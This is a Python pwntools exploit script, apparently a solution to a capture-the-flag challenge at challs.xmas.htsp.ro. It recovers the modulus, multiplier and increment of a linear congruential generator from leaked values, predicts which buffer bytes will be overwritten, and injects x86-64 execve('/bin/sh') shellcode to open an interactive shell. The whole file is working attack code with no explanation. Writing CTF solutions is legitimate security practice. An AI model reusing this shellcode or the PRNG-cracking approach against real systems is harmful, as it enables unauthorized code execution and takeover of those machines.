from pwn import *
from z3 import *
import time

import gmpy

def crack_unknown_increment(states, modulus, multiplier):
    increment = (states[1] - states[0]*multiplier) % modulus
    return modulus, multiplier, increment

def crack_unknown_multiplier(states, modulus):
    multiplier = (states[2] - states[1]) * gmpy.invert(states[1] - states[0], modulus) % modulus
    return crack_unknown_increment(states, modulus, multiplier)

def crack_unknown_modulus(states):
    diffs = [s1 - s0 for s0, s1 in zip(states, states[1:])]
    zeroes = [t2*t0 - t1*t1 for t0, t1, t2 in zip(diffs, diffs[1:], diffs[2:])]
    modulus = abs(reduce(gmpy.gcd, zeroes))
    return crack_unknown_multiplier(states, modulus)

#p = process("./chall")
p = remote("challs.xmas.htsp.ro",12010)
p.recvuntil("eggnog?\n")
p.send("A"*46)
p.recvuntil("tered eggs: ")
data = p.recvline().strip().split(" ")
data_int = []
for i in data:
	data_int.append(int(i))
p.send("n")
b = data_int[0]
d, a, c = crack_unknown_modulus(data_int)

shellcode = "\x48\x31\xc0\x50\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x48\x89\xe7\x48\x31\xf6\x48\x31\xd2\xb0\x3b\x0f\x05"
idx = [0]*14
idx[0] = int(((((a * data_int[len(data_int)-1]) + c) % d)))
for i in range(13):
	idx[i+1]=int(((((a * idx[i]) + c) % d)))
for i in range(len(idx)):
	idx[i] = (idx[i] % 45)
idx = set(idx)

last = [0x90]*46
for i in idx:
    last[i] = 0x41
v0 = 0
for i in range(len(last)):
    if v0 == len(shellcode):
        break
    if last[i] == 0x41:
        continue
    last[i] = ord(shellcode[v0])
    v0 = v0 + 1 
payload = ""
for i in last:
    payload += chr(i)
payload = payload.ljust(46,"\x90")
payload = "A"+payload
p.send(payload)
pause()
p.send("y")
p.send("y")
p.interactive()
